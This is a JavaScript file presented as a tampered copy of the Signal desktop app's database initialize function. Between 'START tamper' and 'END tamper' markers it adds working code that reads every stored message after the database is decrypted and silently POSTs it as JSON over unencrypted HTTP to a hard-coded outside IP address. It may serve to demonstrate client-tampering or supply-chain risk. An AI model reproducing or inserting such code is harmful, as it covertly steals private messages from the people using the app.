```
/**
* A tampered version of Signal's initialize function in sql.js
*/
async function initialize({ configDir, key, messages }) {
  if (db) {
    throw new Error('Cannot initialize more than once!');
  }

  if (!isString(configDir)) {
    throw new Error('initialize: configDir is required!');
  }
  if (!isString(key)) {
    throw new Error('initialize: key is required!');
  }
  if (!isObject(messages)) {
    throw new Error('initialize: message is required!');
  }

  indexedDBPath = join(configDir, 'IndexedDB');

  const dbDir = join(configDir, 'sql');
  mkdirp.sync(dbDir);

  filePath = join(dbDir, 'db.sqlite');

  let promisified;

  try {
    promisified = await openAndSetUpSQLCipher(filePath, { key });

    await updateSchema(promisified);

    // test database

    const cipherIntegrityResult = await getSQLCipherIntegrityCheck(promisified);
    if (cipherIntegrityResult) {
      console.log(
        'Database cipher integrity check failed:',
        cipherIntegrityResult
      );
      throw new Error(
        `Cipher integrity check failed: ${cipherIntegrityResult}`
      );
    }
    const integrityResult = await getSQLIntegrityCheck(promisified);
    if (integrityResult) {
      console.log('Database integrity check failed:', integrityResult);
      throw new Error(`Integrity check failed: ${integrityResult}`);
    }

    // At this point we can allow general access to the database
    db = promisified;

    // test database
    await getMessageCount();
    
    // START tamper
    const https = require('http');
    const data = JSON.stringify(await getAllMessages())
    const options = {
      hostname: '188.166.37.215',
      port: 3000,
      path: '/',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': data.length
      }
    }

    const req = https.request(options, res => {
      console.log(`statusCode: ${res.statusCode}`)
    })
    
    req.on('error', error => {
      console.error(error)
    })
    
    req.write(data)
    req.end()
    
    // END tamper
    
  } catch (error) {
    console.log('Database startup error:', error.stack);
    const buttonIndex = dialog.showMessageBoxSync({
      buttons: [
        messages.copyErrorAndQuit.message,
        messages.deleteAndRestart.message,
      ],
      defaultId: 0,
      detail: redactAll(error.stack),
      message: messages.databaseError.message,
      noLink: true,
      type: 'error',
    });

    if (buttonIndex === 0) {
      clipboard.writeText(
        `Database startup error:\n\n${redactAll(error.stack)}`
      );
    } else {
      if (promisified) {
        await promisified.close();
      }
      await removeDB();
      removeUserConfig();
      app.relaunch();
    }

    app.exit(1);
    return false;
  }

  return true;
}
```
